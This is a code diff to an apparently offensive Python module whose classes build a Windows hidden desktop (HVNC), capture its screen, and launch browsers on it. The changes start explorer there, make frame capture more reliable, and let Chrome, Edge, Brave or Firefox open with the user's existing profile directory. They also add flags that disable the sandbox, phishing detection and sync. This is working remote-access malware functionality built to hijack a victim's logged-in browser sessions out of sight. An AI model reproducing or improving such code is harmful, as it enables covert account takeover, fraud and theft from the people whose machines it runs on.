@@ -431,16 +431,18 @@ class HiddenDesktop:
         startupinfo.wShowWindow = SW_SHOW  # Explorer needs to be visible
         
         try:
+            # Start explorer.exe with /separate flag to force new process
+            # This helps create a proper shell environment on the hidden desktop
             proc = subprocess.Popen(
-                [explorer_path.value],
+                [explorer_path.value, "/separate"],
                 startupinfo=startupinfo,
-                creationflags=subprocess.CREATE_NEW_CONSOLE,
+                creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.CREATE_NEW_PROCESS_GROUP,
             )
             self._processes.append(proc)
             self._shell_started = True
             
-            # Wait for explorer to initialize
-            time.sleep(1.0)
+            # Wait for explorer to initialize (increased time for shell setup)
+            time.sleep(2.0)
             
             logger.info("Started shell on hidden desktop (PID=%d)", proc.pid)
             return True
@@ -648,18 +650,20 @@ class HiddenDesktopCapture:
     
     def _capture_frame(self) -> bytes | None:
         """Capture a single frame. Thread must already be on hidden desktop."""
-        # Use CreateDCW("DISPLAY", ...) for more reliable capture
-        # This creates a DC for the display device of the current desktop
-        hdc_screen = gdi32.CreateDCW("DISPLAY", None, None, None)
+        # Use GetDC(NULL) which gets DC for the current thread's desktop
+        # This is more reliable for hidden desktop capture than CreateDCW
+        hdc_screen = user32.GetDC(None)
         if not hdc_screen:
-            # Fallback to GetDC(NULL)
-            hdc_screen = user32.GetDC(None)
+            # Try CreateDCW as fallback
+            hdc_screen = gdi32.CreateDCW("DISPLAY", None, None, None)
             if not hdc_screen:
-                logger.debug("CreateDCW and GetDC both failed")
+                if not hasattr(self, '_dc_error_logged'):
+                    logger.warning("Both GetDC and CreateDCW failed - hidden desktop may not be ready")
+                    self._dc_error_logged = True
                 return None
-            use_release_dc = True
-        else:
             use_release_dc = False
+        else:
+            use_release_dc = True
         
         try:
             # Get actual screen size using GetDeviceCaps for more reliable results
@@ -676,6 +680,11 @@ class HiddenDesktopCapture:
                 screen_width = self._width
                 screen_height = self._height
             
+            # Log first successful size detection
+            if not hasattr(self, '_size_logged'):
+                logger.info("Hidden desktop screen size: %dx%d", screen_width, screen_height)
+                self._size_logged = True
+            
             # Update frame size if different
             if (screen_width, screen_height) != self._frame_size:
                 self._frame_size = (screen_width, screen_height)
@@ -686,30 +695,44 @@ class HiddenDesktopCapture:
             # Create compatible DC
             hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
             if not hdc_mem:
-                logger.debug("CreateCompatibleDC failed")
+                if not hasattr(self, '_memdc_error_logged'):
+                    logger.warning("CreateCompatibleDC failed")
+                    self._memdc_error_logged = True
                 return None
             
             try:
                 # Create bitmap
                 hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
                 if not hbitmap:
-                    logger.debug("CreateCompatibleBitmap failed")
+                    if not hasattr(self, '_bitmap_error_logged'):
+                        logger.warning("CreateCompatibleBitmap failed")
+                        self._bitmap_error_logged = True
                     return None
                 
                 try:
                     old_bitmap = gdi32.SelectObject(hdc_mem, hbitmap)
                     
                     # BitBlt from screen to memory DC
+                    # Use SRCCOPY | CAPTUREBLT for better capture of layered windows
+                    CAPTUREBLT = 0x40000000
                     result = gdi32.BitBlt(
                         hdc_mem, 0, 0, screen_width, screen_height,
-                        hdc_screen, 0, 0, SRCCOPY
+                        hdc_screen, 0, 0, SRCCOPY | CAPTUREBLT
                     )
                     
                     if not result:
-                        error = ctypes.get_last_error()
-                        logger.debug("BitBlt failed, error=%d", error)
-                        gdi32.SelectObject(hdc_mem, old_bitmap)
-                        return None
+                        # Try without CAPTUREBLT as fallback
+                        result = gdi32.BitBlt(
+                            hdc_mem, 0, 0, screen_width, screen_height,
+                            hdc_screen, 0, 0, SRCCOPY
+                        )
+                        if not result:
+                            error = ctypes.get_last_error()
+                            if not hasattr(self, '_bitblt_error_logged'):
+                                logger.warning("BitBlt failed, error=%d", error)
+                                self._bitblt_error_logged = True
+                            gdi32.SelectObject(hdc_mem, old_bitmap)
+                            return None
                     
                     gdi32.SelectObject(hdc_mem, old_bitmap)
                     
@@ -739,8 +762,15 @@ class HiddenDesktopCapture:
                     
                     if result == 0:
                         error = ctypes.get_last_error()
-                        logger.debug("GetDIBits failed, error=%d", error)
+                        if not hasattr(self, '_getdib_error_logged'):
+                            logger.warning("GetDIBits failed, error=%d", error)
+                            self._getdib_error_logged = True
                         return None
+                    
+                    # Log first successful capture
+                    if not hasattr(self, '_first_frame_logged'):
+                        logger.info("First frame captured successfully: %dx%d", screen_width, screen_height)
+                        self._first_frame_logged = True
                     
                     return buffer.raw
                     
@@ -765,9 +795,17 @@ class HiddenDesktopCapture:
             return
         
         logger.info("Capture thread switched to hidden desktop: %s", self._desktop.name)
+        
+        # Wait for desktop to be fully ready
+        # Hidden desktop needs time to initialize its DC and message queue
+        time.sleep(0.5)
+        
         self._initialized.set()
         
         frame_count = 0
+        fail_count = 0
+        max_fail_log = 10  # Only log first 10 failures
+        
         while not self._stop_event.is_set():
             start = time.monotonic()
             
@@ -777,8 +815,15 @@ class HiddenDesktopCapture:
                     with self._frame_lock:
                         self._frame = frame
                     frame_count += 1
+                    fail_count = 0  # Reset fail count on success
                     if frame_count % 300 == 0:  # Log every ~10 seconds at 30fps
                         logger.debug("Captured %d frames", frame_count)
+                else:
+                    fail_count += 1
+                    if fail_count <= max_fail_log:
+                        logger.debug("Frame capture returned None (count=%d)", fail_count)
+                    elif fail_count == max_fail_log + 1:
+                        logger.warning("Repeated capture failures, suppressing further logs")
             except Exception as exc:
                 logger.debug("Capture error: %s", exc)
             
@@ -1114,6 +1159,7 @@ class HVNCSession:
         browser: str,
         url: str | None = None,
         extra_args: list[str] | None = None,
+        profile_path: str | None = None,
     ) -> subprocess.Popen | None:
         """Launch a browser on the hidden desktop.
         
@@ -1121,12 +1167,14 @@ class HVNCSession:
             browser: Browser name (chrome, firefox, edge)
             url: URL to open
             extra_args: Additional command line arguments
+            profile_path: Path to browser profile directory (for --user-data-dir)
         """
         # Resolve browser path
         browser_paths = {
             "chrome": [
                 r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                 r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+                os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "Application", "chrome.exe"),
             ],
             "firefox": [
                 r"C:\Program Files\Mozilla Firefox\firefox.exe",
@@ -1135,6 +1183,12 @@ class HVNCSession:
             "edge": [
                 r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                 r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
+                os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "Application", "msedge.exe"),
+            ],
+            "brave": [
+                r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
+                r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
+                os.path.join(os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
             ],
         }
         
@@ -1152,21 +1206,36 @@ class HVNCSession:
             return None
         
         # Build args
-        args = extra_args or []
+        args = list(extra_args) if extra_args else []
         
         # Add browser-specific flags
-        if browser_lower in ("chrome", "edge"):
+        if browser_lower in ("chrome", "edge", "brave"):
             args.extend([
                 "--no-sandbox",
                 "--disable-gpu",
                 "--disable-software-rasterizer",
                 "--no-first-run",
                 "--no-default-browser-check",
+                "--disable-background-networking",
+                "--disable-client-side-phishing-detection",
+                "--disable-sync",
             ])
+            
+            # Add profile path if provided
+            if profile_path and os.path.isdir(profile_path):
+                args.append(f"--user-data-dir={profile_path}")
+                logger.info("Using custom profile path: %s", profile_path)
+        
+        elif browser_lower == "firefox":
+            # Firefox uses -profile flag
+            if profile_path and os.path.isdir(profile_path):
+                args.extend(["-profile", profile_path])
+                logger.info("Using custom Firefox profile: %s", profile_path)
         
         if url:
             args.append(url)
         
+        logger.info("Launching %s with args: %s", browser, args[:5])  # Log first 5 args
         return self.launch_application(exe_path, args=args)
     
     def get_frame(self, timeout: float = 0.5) -> tuple[bytes | None, tuple[int, int]]:
